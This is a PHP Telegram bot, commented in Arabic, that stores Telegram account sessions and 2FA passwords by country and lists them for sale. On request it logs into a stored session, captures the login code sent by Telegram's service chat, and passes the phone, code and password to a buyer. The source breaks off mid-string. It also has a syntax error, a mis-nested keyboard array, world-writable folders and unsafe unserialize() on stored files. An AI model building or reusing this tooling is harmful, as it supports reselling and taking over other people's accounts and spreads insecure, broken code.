<?php
// ═══════════════════════════════════════════════════════════════════════════
// 🔥🔥🔥 بوت إدارة حسابات تيلجرام - الإصدار الفخم 2099 (النهائي) 🔥🔥🔥
// ═══════════════════════════════════════════════════════════════════════════

require_once __DIR__ . '/madeline.php';
require_once __DIR__ . '/config.php';

use danog\MadelineProto\API;
use danog\MadelineProto\Settings\AppInfo;
use danog\MadelineProto\Settings;

// ═══════════════════════════════════════════════════════════════════════════
// 📦 قاعدة البيانات والإعدادات الأولية
// ═══════════════════════════════════════════════════════════════════════════

// إنشاء المجلدات إذا لم تكن موجودة
$folders = [__DIR__ . '/database', SESSIONS_PATH, SERIALIZED_PATH];
foreach ($folders as $folder) {
    if (!is_dir($folder)) {
        mkdir($folder, 0777, true);
    }
}

$db = new PDO('sqlite:' . DB_PATH);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->exec("PRAGMA journal_mode=WAL");
$db->exec("PRAGMA synchronous=NORMAL");

// قائمة الدول الكاملة
$masterCountriesList = [
    '967' => ['name' => 'اليمن', 'flag' => '🇾🇪'],
    '966' => ['name' => 'السعودية', 'flag' => '🇸🇦'],
    '20'  => ['name' => 'مصر', 'flag' => '🇪🇬'],
    '213' => ['name' => 'الجزائر', 'flag' => '🇩🇿'],
    '212' => ['name' => 'المغرب', 'flag' => '🇲🇦'],
    '216' => ['name' => 'تونس', 'flag' => '🇹🇳'],
    '218' => ['name' => 'ليبيا', 'flag' => '🇱🇾'],
    '964' => ['name' => 'العراق', 'flag' => '🇮🇶'],
    '962' => ['name' => 'الأردن', 'flag' => '🇯🇴'],
    '961' => ['name' => 'لبنان', 'flag' => '🇱🇧'],
    '970' => ['name' => 'فلسطين', 'flag' => '🇵🇸'],
    '971' => ['name' => 'الإمارات', 'flag' => '🇦🇪'],
    '968' => ['name' => 'عمان', 'flag' => '🇴🇲'],
    '974' => ['name' => 'قطر', 'flag' => '🇶🇦'],
    '965' => ['name' => 'الكويت', 'flag' => '🇰🇼'],
    '1'   => ['name' => 'أمريكا/كندا', 'flag' => '🇺🇸🇨🇦'],
    '44'  => ['name' => 'بريطانيا', 'flag' => '🇬🇧'],
    '91'  => ['name' => 'الهند', 'flag' => '🇮🇳'],
    '92'  => ['name' => 'باكستان', 'flag' => '🇵🇰'],
    '90'  => ['name' => 'تركيا', 'flag' => '🇹🇷'],
    '49'  => ['name' => 'ألمانيا', 'flag' => '🇩🇪'],
    '33'  => ['name' => 'فرنسا', 'flag' => '🇫🇷'],
    '34'  => ['name' => 'إسبانيا', 'flag' => '🇪🇸'],
    '39'  => ['name' => 'إيطاليا', 'flag' => '🇮🇹'],
    '7'   => ['name' => 'روسيا', 'flag' => '🇷🇺'],
    '81'  => ['name' => 'اليابان', 'flag' => '🇯🇵'],
    '86'  => ['name' => 'الصين', 'flag' => '🇨🇳'],
    '66'  => ['name' => 'تايلاند', 'flag' => '🇹🇭'],
];

// إنشاء الجداول
$db->exec("
CREATE TABLE IF NOT EXISTS countries (
    code TEXT PRIMARY KEY, 
    name TEXT, 
    flag TEXT
);

CREATE TABLE IF NOT EXISTS accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    phone TEXT UNIQUE, 
    country_code TEXT, 
    session_file TEXT, 
    password TEXT, 
    status TEXT DEFAULT 'active', 
    stored_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS activation_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    phone TEXT, 
    admin_id INTEGER, 
    step TEXT, 
    temp_file TEXT, 
    country_code TEXT, 
    code_hash TEXT, 
    serialized_file TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS pending_orders (
    account_id INTEGER PRIMARY KEY, 
    buyer_id INTEGER, 
    requested_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS sent_codes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    account_id INTEGER,
    code TEXT,
    sent_at INTEGER,
    UNIQUE(account_id, code)
);
");

// إعادة تعبئة جدول الدول
$stmt = $db->prepare("INSERT OR IGNORE INTO countries (code, name, flag) VALUES (?, ?, ?)");
foreach ($masterCountriesList as $code => $info) {
    $stmt->execute([$code, $info['name'], $info['flag']]);
}

// ═══════════════════════════════════════════════════════════════════════════
// 🎨 دوال التنسيق الفخم
// ═══════════════════════════════════════════════════════════════════════════
function fancyHeader($title, $icon = '✨') { return "\n╔════════════════════════════════════════╗\n║  {$icon} <b>" . strtoupper($title) . "</b> {$icon}  ║\n╠════════════════════════════════════════╣\n"; }
function fancyFooter() { return "\n╚════════════════════════════════════════╝\n⚡ <i>" . FOOTER_TEXT . "</i> ⚡"; }
function fancyMessage($title, $content, $icon = '📌') { return fancyHeader($title, $icon) . $content . fancyFooter(); }
function formatPhone($phone) { return "📞 <code>" . htmlspecialchars($phone) . "</code>"; }
function formatCode($code) { return "🔑 <code>" . htmlspecialchars($code) . "</code>"; }
function formatPassword($pass) { return "🔐 <code>" . htmlspecialchars($pass) . "</code>"; }
function formatDate() { return "🕒 <i>" . date('Y-m-d | h:i:s A') . "</i>"; }

// ═══════════════════════════════════════════════════════════════════════════
// 🔧 دالة التعرف على الدولة (المطورة)
// ═══════════════════════════════════════════════════════════════════════════

function getCountryByPhone($phone, $db) {
    // تنظيف الرقم من أي أحرف غير أرقام و+
    $clean = preg_replace('/[^0-9+]/', '', $phone);
    
    // جلب جميع الدول من قاعدة البيانات
    $stmt = $db->query("SELECT code, name, flag FROM countries");
    $countries = $stmt->fetchAll(PDO::FETCH_ASSOC);
    
    // ترتيب الرموز من الأطول إلى الأقصر (لتجنب تداخل الرموز)
    usort($countries, function($a, $b) {
        return strlen($b['code']) - strlen($a['code']);
    });
    
    foreach ($countries as $country) {
        $code = $country['code'];
        
        // صيغة 1: +967XXXXXXXX
        if (strpos($clean, '+' . $code) === 0) {
            return $country;
        }
        
        // صيغة 2: 00967XXXXXXXX
        if (strpos($clean, '00' . $code) === 0) {
            return $country;
        }
        
        // صيغة 3: 967XXXXXXXX (بدون + أو 00)
        if (strpos($clean, $code) === 0) {
            // التأكد أن الرمز ليس جزءاً من رقم أطول
            $nextChar = substr($clean, strlen($code), 1);
            if (empty($nextChar) || !is_numeric($nextChar)) {
                return $country;
            }
        }
    }
    
    return null;
}

// دالة لتنسيق الرقم بشكل موحد
function normalizePhone($phone) {
    // إزالة أي مسافات أو شرطات
    $clean = preg_replace('/[^0-9+]/', '', $phone);
    
    // إذا كان الرقم يبدأ بـ 00، استبدلها بـ +
    if (strpos($clean, '00') === 0) {
        $clean = '+' . substr($clean, 2);
    }
    // إذا كان الرقم أرقام فقط ولا يبدأ بـ +، أضف +
    else if (strpos($clean, '+') !== 0 && preg_match('/^\d+$/', $clean)) {
        $clean = '+' . $clean;
    }
    
    return $clean;
}

function botApi($method, $params) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/" . $method;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $result = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    if ($error) error_log("CURL Error: $error");
    return json_decode($result, true);
}

function sendMessage($chat_id, $text, $keyboard = null) {
    $params = ['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML'];
    if ($keyboard) $params['reply_markup'] = json_encode($keyboard);
    return botApi('sendMessage', $params);
}

function editMessage($chat_id, $msg_id, $text, $keyboard = null) {
    $params = ['chat_id' => $chat_id, 'message_id' => $msg_id, 'text' => $text, 'parse_mode' => 'HTML'];
    if ($keyboard) $params['reply_markup'] = json_encode($keyboard);
    return botApi('editMessageText', $params);
}

function logoutAccount($sessionFile, $phone, $db, $acc_id = null) {
    try {
        if (file_exists($sessionFile)) {
            $settings = new Settings();
            $appInfo = new AppInfo();
            $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
            $settings->setAppInfo($appInfo);
            $mad = new API($sessionFile, $settings);
            $mad->start();
            try { $mad->logout(); } catch (Exception $e) {}
            unlink($sessionFile);
        }
        if ($acc_id) {
            $stmt = $db->prepare("UPDATE accounts SET status='removed' WHERE id=?");
            $stmt->execute([$acc_id]);
        }
        return true;
    } catch (Exception $e) {
        error_log("LogoutAccount error: " . $e->getMessage());
        return false;
    }
}

function saveMadelineSerialized($mad, $phone) {
    $filePath = SERIALIZED_PATH . md5($phone) . '.txt';
    $serialized = base64_encode(serialize($mad));
    file_put_contents($filePath, $serialized);
    return $filePath;
}

function loadMadelineSerialized($filePath) {
    if (!file_exists($filePath)) return null;
    $data = file_get_contents($filePath);
    if (!$data) return null;
    return unserialize(base64_decode($data));
}

// ═══════════════════════════════════════════════════════════════════════════
// 🚀 المعالجة الرئيسية
// ═══════════════════════════════════════════════════════════════════════════

$update = json_decode(file_get_contents('php://input'), true);
if (!$update) exit;

$message = $update['message'] ?? null;
$callback = $update['callback_query'] ?? null;
$chat_id = $message['chat']['id'] ?? ($callback['message']['chat']['id'] ?? 0);
$user_id = $message['from']['id'] ?? ($callback['from']['id'] ?? 0);
$msg_id = $callback['message']['message_id'] ?? 0;

// كود اختبار التعرف على الرقم - أرسل "test +967XXXXXXXX"
if ($message && preg_match('/^test (.+)$/', trim($message['text'] ?? ''), $testMatch)) {
    $testPhone = $testMatch[1];
    $normalized = normalizePhone($testPhone);
    $testCountry = getCountryByPhone($testPhone, $db);
    if ($testCountry) {
        sendMessage($chat_id, "✅ اختبار ناجح!\n📞 الرقم الأصلي: $testPhone\n📞 بعد التنسيق: $normalized\n🌍 الدولة: {$testCountry['flag']} {$testCountry['name']}\n🔢 الرمز: {$testCountry['code']}");
    } else {
        sendMessage($chat_id, "❌ فشل التعرف على الرقم: $testPhone\n📞 بعد التنسيق: $normalized\n\n💡 جرب إحدى هذه الصيغ:\n• +967XXXXXXXX\n• 00967XXXXXXXX\n• 967XXXXXXXX");
    }
    exit;
}

// التحقق من صلاحيات المدير
if ($user_id != ADMIN_ID) {
    if ($message) {
        $errorMsg = fancyMessage('⛔ غير مصرح ⛔', 
            "✋ <b>عذراً، أنت غير مخول لاستخدام هذا البوت!</b>\n\n" .
            "🔒 هذا البوت مخصص للمدير فقط.\n" .
            formatDate());
        sendMessage($chat_id, $errorMsg);
    }
    exit;
}

// ═══════════════════════════════════════════════════════════════════════════
// 🏠 /start - القائمة الرئيسية
// ═══════════════════════════════════════════════════════════════════════════

if ($message && trim($message['text'] ?? '') === '/start') {
    $welcomeMsg = fancyHeader('مرحباً أيها المدير', '👑') . "
🌟 <b>" . BOT_NAME . "</b> 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>✨ نظام إدارة حسابات تيلجرام الاحترافي ✨</b>
📡 <b>الإصدار:</b> " . BOT_VERSION . "
⚙️ <b>الحالة:</b> <code>ONLINE 🟢</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>إحصائيات سريعة:</b>
" . fancyFooter();

    $keyboard = [
        'inline_keyboard' => [
            [['text' => '📦 🏦 تخزين حسابات جديدة', 'callback_data' => 'store']],
            [['text' => '🛒 💰 جلب حسابات للبيع', 'callback_data' => 'buy']],
            [['text' => '🌍 📊 عرض المخزون والإحصائيات', 'callback_data' => 'stock']],
            [['text' => '🌍 ⚙️ إدارة الدول', 'callback_data' => 'manage_countries']]
        ]
    ];
    sendMessage($chat_id, $welcomeMsg, $keyboard);
    exit;
}

// ═══════════════════════════════════════════════════════════════════════════
// 🎮 معالجة الأزرار
// ═══════════════════════════════════════════════════════════════════════════

if ($callback) {
    botApi('answerCallbackQuery', ['callback_query_id' => $callback['id']]);
    $data = $callback['data'];

    // ========== 1. زر التخزين ==========
    if ($data === 'store') {
        $tempFile = SESSIONS_PATH . 'temp_' . uniqid() . '.madeline';
        $stmt = $db->prepare("INSERT INTO activation_sessions (admin_id, step, temp_file) VALUES (?, 'awaiting_phone', ?)");
        $stmt->execute([$user_id, $tempFile]);
        
        $msg = fancyMessage('📦 عملية التخزين', "
📱 <b>أرسل رقم الهاتف</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 <b>الصيغ المدعومة:</b>
• <code>+967XXXXXXXX</code>
• <code>00967XXXXXXXX</code>
• <code>967XXXXXXXX</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 <b>الدول المتاحة:</b> " . $db->query("SELECT COUNT(*) FROM countries")->fetchColumn() . " دولة
⚠️ <i>سيتم التعرف على الدولة تلقائياً</i>
" . formatDate(), '📦');
        sendMessage($chat_id, $msg);
        exit;
    }
    
    // ========== 2. زر الشراء ==========
    elseif ($data === 'buy') {
        $stmt = $db->query("SELECT country_code, COUNT(*) as cnt FROM accounts WHERE status='active' GROUP BY country_code");
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        if (!$rows) {
            $msg = fancyMessage('🛒 جلب حسابات', "
📭 <b>لا يوجد حسابات متاحة حاليًا</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💔 عذراً، المخزون فارغ حالياً
🔄 يرجى المحاولة لاحقاً
" . formatDate(), '🛒');
            sendMessage($chat_id, $msg);
        } else {
            $buttons = [];
            foreach ($rows as $row) {
                $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
                $stmt_c->execute([$row['country_code']]);
                $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
                if ($c) {
                    $buttons[] = [['text' => "{$c['flag']} {$c['name']} ━━━ {$row['cnt']} حسابات 📦", 'callback_data' => "buy_country_{$row['country_code']}"]];
                }
            }
            $msg = fancyMessage('🌍 اختيار الدولة', "
📋 <b>اختر الدولة التي تريد شراء حساب منها</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>المخزون المتاح حسب الدولة:</b>
" . formatDate());
            sendMessage($chat_id, $msg, ['inline_keyboard' => $buttons]);
        }
        exit;
    }
    
    // ========== 3. زر المخزون ==========
    elseif ($data === 'stock') {
        $stmt = $db->query("SELECT country_code, COUNT(*) as cnt FROM accounts WHERE status='active' GROUP BY country_code");
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        if (!$rows) {
            $msg = fancyMessage('📊 المخزون', "
📭 <b>لا يوجد حسابات في المخزون</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💔 المخزون فارغ تماماً
" . formatDate(), '📊');
            sendMessage($chat_id, $msg);
        } else {
            $stockMsg = "📊 <b>تقرير المخزون الحالي</b> 📊\n";
            $stockMsg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
            $total = 0;
            foreach ($rows as $row) {
                $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
                $stmt_c->execute([$row['country_code']]);
                $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
                if ($c) {
                    $stockMsg .= "{$c['flag']} <b>{$c['name']}</b> ━━━ <code>{$row['cnt']}</code> حسابات\n";
                    $total += $row['cnt'];
                }
            }
            $stockMsg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
            $stockMsg .= "📦 <b>إجمالي المخزون:</b> <code>$total</code> حساب\n";
            $stockMsg .= formatDate();
            
            $msg = fancyMessage('📊 تقرير المخزون', $stockMsg, '📊');
            sendMessage($chat_id, $msg);
        }
        exit;
    }
    
    // ========== 4. إدارة الدول ==========
    elseif ($data === 'manage_countries') {
        $keyboard = [
            'inline_keyboard' => [
                [['text' => '📋 عرض جميع الدول', 'callback_data' => 'list_countries']],
                [['text'' => '🔄 تحديث الدول من القائمة الأساسية', 'callback_data' => 'reset_countries']],
                [['text' => '➕ إضافة دولة جديدة', 'callback_data' => 'add_country_step1']],
                [['text' => '🔙 رجوع', 'callback_data' => 'back_to_main']]
            ]
        ];
        $msg = fancyMessage('🌍 إدارة الدول', "
📋 <b>لوحة التحكم بالدول</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ <b>عرض الدول:</b> مشاهدة جميع الدول المخزنة
🔄 <b>تحديث الدول:</b> إعادة تعبئة الدول من القائمة الأساسية
➕ <b>إضافة دولة:</b> إضافة دولة جديدة يدوياً
" . formatDate(), '🌍');
        sendMessage($chat_id, $msg, $keyboard);
        exit;
    }
    
    // ========== عرض جميع الدول ==========
    elseif ($data === 'list_countries') {
        $stmt = $db->query("SELECT * FROM countries ORDER BY code");
        $countries = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        if (empty($countries)) {
            sendMessage($chat_id, fancyMessage('📋 قائمة الدول', "📭 لا توجد دول في قاعدة البيانات.\nاستخدم زر التحديث لإضافة الدول الأساسية.", '📋'));
        } else {
            $msg = "📋 <b>قائمة الدول المخزنة</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
            foreach ($countries as $c) {
                $msg .= "{$c['flag']} <b>{$c['name']}</b> ━━━ رمز: <code>{$c['code']}</code>\n";
            }
            $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 <b>الإجمالي:</b> " . count($countries) . " دولة\n" . formatDate();
            sendMessage($chat_id, fancyMessage('📋 قائمة الدول', $msg, '📋'));
        }
        exit;
    }
    
    // ========== تحديث الدول ==========
    elseif ($data === 'reset_countries') {
        $db->exec("DELETE FROM countries");
        
        $masterList = [
            '967' => ['name' => 'اليمن', 'flag' => '🇾🇪'],
            '966' => ['name' => 'السعودية', 'flag' => '🇸🇦'],
            '20'  => ['name' => 'مصر', 'flag' => '🇪🇬'],
            '213' => ['name' => 'الجزائر', 'flag' => '🇩🇿'],
            '212' => ['name' => 'المغرب', 'flag' => '🇲🇦'],
            '216' => ['name' => 'تونس', 'flag' => '🇹🇳'],
            '218' => ['name' => 'ليبيا', 'flag' => '🇱🇾'],
            '964' => ['name' => 'العراق', 'flag' => '🇮🇶'],
            '962' => ['name' => 'الأردن', 'flag' => '🇯🇴'],
            '961' => ['name' => 'لبنان', 'flag' => '🇱🇧'],
            '970' => ['name' => 'فلسطين', 'flag' => '🇵🇸'],
            '971' => ['name' => 'الإمارات', 'flag' => '🇦🇪'],
            '968' => ['name' => 'عمان', 'flag' => '🇴🇲'],
            '974' => ['name' => 'قطر', 'flag' => '🇶🇦'],
            '965' => ['name' => 'الكويت', 'flag' => '🇰🇼'],
            '1'   => ['name' => 'أمريكا/كندا', 'flag' => '🇺🇸🇨🇦'],
            '44'  => ['name' => 'بريطانيا', 'flag' => '🇬🇧'],
            '91'  => ['name' => 'الهند', 'flag' => '🇮🇳'],
            '92'  => ['name' => 'باكستان', 'flag' => '🇵🇰'],
            '90'  => ['name' => 'تركيا', 'flag' => '🇹🇷'],
            '49'  => ['name' => 'ألمانيا', 'flag' => '🇩🇪'],
            '33'  => ['name' => 'فرنسا', 'flag' => '🇫🇷'],
            '34'  => ['name' => 'إسبانيا', 'flag' => '🇪🇸'],
            '39'  => ['name' => 'إيطاليا', 'flag' => '🇮🇹'],
            '7'   => ['name' => 'روسيا', 'flag' => '🇷🇺'],
            '81'  => ['name' => 'اليابان', 'flag' => '🇯🇵'],
            '86'  => ['name' => 'الصين', 'flag' => '🇨🇳'],
            '66'  => ['name' => 'تايلاند', 'flag' => '🇹🇭'],
        ];
        
        $stmt = $db->prepare("INSERT INTO countries (code, name, flag) VALUES (?, ?, ?)");
        foreach ($masterList as $code => $info) {
            $stmt->execute([$code, $info['name'], $info['flag']]);
        }
        
        $msg = fancyMessage('🔄 تحديث الدول', "
✅ <b>تم تحديث الدول بنجاح!</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 تم إضافة " . count($masterList) . " دولة إلى قاعدة البيانات
" . formatDate(), '🔄');
        sendMessage($chat_id, $msg);
        exit;
    }
    
    // ========== إضافة دولة جديدة - الخطوة 1 ==========
    elseif ($data === 'add_country_step1') {
        $stmt = $db->prepare("INSERT OR REPLACE INTO activation_sessions (admin_id, step, temp_file) VALUES (?, 'add_country_name', '')");
        $stmt->execute([$user_id]);
        
        $msg = fancyMessage('➕ إضافة دولة جديدة', "
📝 <b>الخطوة 1 من 3</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 <b>أرسل اسم الدولة</b>
📱 مثال: <code>تايلاند</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ سيتم طلب رمز الدولة والعلم في الخطوات التالية
" . formatDate(), '➕');
        sendMessage($chat_id, $msg);
        exit;
    }
    
    // ========== الرجوع للقائمة الرئيسية ==========
    elseif ($data === 'back_to_main') {
        $keyboard = [
            'inline_keyboard' => [
                [['text' => '📦 🏦 تخزين حسابات جديدة', 'callback_data' => 'store']],
                [['text' => '🛒 💰 جلب حسابات للبيع', 'callback_data' => 'buy']],
                [['text' => '🌍 📊 عرض المخزون والإحصائيات', 'callback_data' => 'stock']],
                [['text' => '🌍 ⚙️ إدارة الدول', 'callback_data' => 'manage_countries']]
            ]
        ];
        $msg = fancyMessage('🏠 القائمة الرئيسية', "
🌟 <b>" . BOT_NAME . "</b> 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>✨ مرحباً أيها المدير ✨</b>
📡 <b>الإصدار:</b> " . BOT_VERSION . "
⚙️ <b>الحالة:</b> <code>ONLINE 🟢</code>
" . formatDate(), '🏠');
        sendMessage($chat_id, $msg, $keyboard);
        exit;
    }
    
    // ========== اختيار دولة للشراء ==========
    elseif (preg_match('/^buy_country_(\w+)$/', $data, $match)) {
        $country_code = $match[1];
        $stmt = $db->prepare("SELECT id, phone FROM accounts WHERE country_code=? AND status='active' LIMIT 1");
        $stmt->execute([$country_code]);
        $acc = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if (!$acc) {
            $msg = fancyMessage('❌ خطأ', "
⚠️ <b>لا يوجد حسابات متاحة لهذه الدولة حالياً</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📭 المخزون نفد من هذه الدولة
🔄 يرجى اختيار دولة أخرى", '❌');
            sendMessage($chat_id, $msg);
            exit;
        }
        
        $stmt = $db->prepare("INSERT OR REPLACE INTO pending_orders (account_id, buyer_id) VALUES (?, ?)");
        $stmt->execute([$acc['id'], $user_id]);
        
        $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
        $stmt_c->execute([$country_code]);
        $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
        
        $msg = fancyMessage('📋 معلومات الحساب', "
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🗺️ <b>الدولة:</b> {$c['flag']} {$c['name']}
" . formatPhone($acc['phone']) . "
🔑 <b>الكود:</b> <i>⏳ قيد الانتظار...</i>
" . formatDate() . "
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👇 <b>اضغط الزر أدناه لطلب كود الدخول</b>", '📋');
        
        $keyboard = [['inline_keyboard' => [[['text' => '📲 ✨ طلب كود الدخول ✨ 📲', 'callback_data' => "request_code_{$acc['id']}"]]]]];
        sendMessage($chat_id, $msg, $keyboard);
        exit;
    }
    
    // ========== طلب الكود ==========
    elseif (preg_match('/^request_code_(\d+)$/', $data, $match)) {
        $acc_id = (int)$match[1];
        
        botApi('answerCallbackQuery', [
            'callback_query_id' => $callback['id'],
            'text' => '⏳ جاري طلب الكود... انتظر قليلاً ⏳',
            'show_alert' => false
        ]);
        
        $stmt = $db->prepare("SELECT phone, session_file, password FROM accounts WHERE id=? AND status='active'");
        $stmt->execute([$acc_id]);
        $acc = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if (!$acc) {
            $msg = fancyMessage('⚠️ خطأ', "الحساب غير متوفر.", '⚠️');
            sendMessage($chat_id, $msg);
            exit;
        }
        
        if (!file_exists($acc['session_file'])) {
            $msg = fancyMessage('❌ خطأ', "ملف الجلسة مفقود: " . basename($acc['session_file']) . "\nسيتم حذف الحساب تلقائياً.", '❌');
            sendMessage($chat_id, $msg);
            logoutAccount($acc['session_file'], $acc['phone'], $db, $acc_id);
            exit;
        }
        
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        
        try {
            $mad = new API($acc['session_file'], $settings);
            $mad->start();
            
            $sentCode = $mad->phoneLogin($acc['phone']);
            
            $searchStartTime = time();
            $code = null;
            $lastCheckedMsgId = 0;
            
            $lastCheckedFile = SERIALIZED_PATH . "last_msg_{$acc_id}.txt";
            if (file_exists($lastCheckedFile)) {
                $lastCheckedMsgId = (int)file_get_contents($lastCheckedFile);
            }
            
            sendMessage($chat_id, "⏳ <b>جاري طلب وإرسال الكود...</b>\n📡 يرجى الانتظار لمدة تصل إلى 6 دقائق\n" . formatDate());
            
            $timeout = CODE_SEARCH_TIMEOUT;
            
            while (time() - $searchStartTime < $timeout) {
                try {
                    $messages = $mad->messages->getHistory([
                        'peer' => 777000,
                        'limit' => 20,
                        'offset_id' => $lastCheckedMsgId
                    ]);
                    
                    if (isset($messages['messages']) && !empty($messages['messages'])) {
                        foreach ($messages['messages'] as $msg) {
                            $msgId = $msg['id'] ?? 0;
                            $msgDate = $msg['date'] ?? 0;
                            
                            if (time() - $msgDate > $timeout) continue;
                            if ($msgId <= $lastCheckedMsgId) continue;
                            
                            if (isset($msg['message']) && preg_match('/\b(\d{5,6})\b/', $msg['message'], $matches)) {
                                $potentialCode = $matches[1];
                                
                                $stmt_check = $db->prepare("SELECT COUNT(*) FROM sent_codes WHERE account_id=? AND code=?");
                                $stmt_check->execute([$acc_id, $potentialCode]);
                                $codeExists = $stmt_check->fetchColumn();
                                
                                if (!$codeExists) {
                                    $code = $potentialCode;
                                    $stmt_insert = $db->prepare("INSERT INTO sent_codes (account_id, code, sent_at) VALUES (?, ?, ?)");
                                    $stmt_insert->execute([$acc_id, $code, time()]);
                                    break 2;
                                }
                            }
                            
                            if ($msgId > $lastCheckedMsgId) {
                                $lastCheckedMsgId = $msgId;
                            }
                        }
                        file_put_contents($lastCheckedFile, $lastCheckedMsgId);
                    }
                } catch (Exception $e) {
                    error_log("Error fetching messages: " . $e->getMessage());
                }
                sleep(CODE_SEARCH_INTERVAL);
            }
            
            if (!$code) {
                $msg = fancyMessage('❌ فشل استلام الكود', "
⚠️ <b>لم يتم استلام كود جديد خلال 6 دقائق</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 الرقم: " . formatPhone($acc['phone']) . "
💡 تأكد من:
• أن رقم الحساب نشط
• أن التطبيق مسجل بشكل صحيح
• إعادة المحاولة لاحقاً
" . formatDate(), '❌');
                sendMessage($chat_id, $msg);
                exit;
            }
            
            $password = $acc['password'] ?? 'لا توجد كلمة مرور';
            
            $codeMsg = fancyMessage('🎉 تم استلام الكود 🎉', "
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
" . formatPhone($acc['phone']) . "
" . formatCode($code) . "
" . formatPassword($password) . "
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <b>هذا الكود صالح للاستخدام لمرة واحدة فقط</b>
" . formatDate(), '🔑');
            sendMessage($chat_id, $codeMsg);
            
            $stmt_c = $db->prepare("SELECT country_code FROM accounts WHERE id=?");
            $stmt_c->execute([$acc_id]);
            $acc_data = $stmt_c->fetch(PDO::FETCH_ASSOC);
            
            $stmt_c2 = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
            $stmt_c2->execute([$acc_data['country_code']]);
            $c = $stmt_c2->fetch(PDO::FETCH_ASSOC);
            
            $newText = fancyMessage('✅ تم جلب الكود ✅', "
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🗺️ <b>الدولة:</b> {$c['flag']} {$c['name']}
" . formatPhone($acc['phone']) . "
" . formatCode($code) . "
" . formatPassword($password) . "
" . formatDate() . "
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👇 <b>يمكنك طلب كود جديد أو تسجيل الخروج</b>", '✅');
            
            $keyboard = [
                'inline_keyboard' => [
                    [['text' => '🔄 📲 طلب كود جديد', 'callback_data' => "request_code_{$acc_id}"]],
                    [['text' => '🚪 🔓 تسجيل الخروج من الحساب', 'callback_data' => "logout_account_{$acc_id}"]]
                ]
            ];
            editMessage($chat_id, $msg_id, $newText, $keyboard);
            
        } catch (Exception $e) {
            $msg = fancyMessage('❌ خطأ في الطلب', "فشل طلب الكود: " . $e->getMessage(), '❌');
            sendMessage($chat_id, $msg);
        }
        exit;
    }
    
    // ========== تسجيل الخروج ==========
    elseif (preg_match('/^logout_account_(\d+)$/', $data, $match)) {
        $acc_id = (int)$match[1];
        $stmt = $db->prepare("SELECT session_file, phone FROM accounts WHERE id=?");
        $stmt->execute([$acc_id]);
        $acc = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if ($acc) {
            logoutAccount($acc['session_file'], $acc['phone'], $db, $acc_id);
            $msg = fancyMessage('✅ تم تسجيل الخروج', "
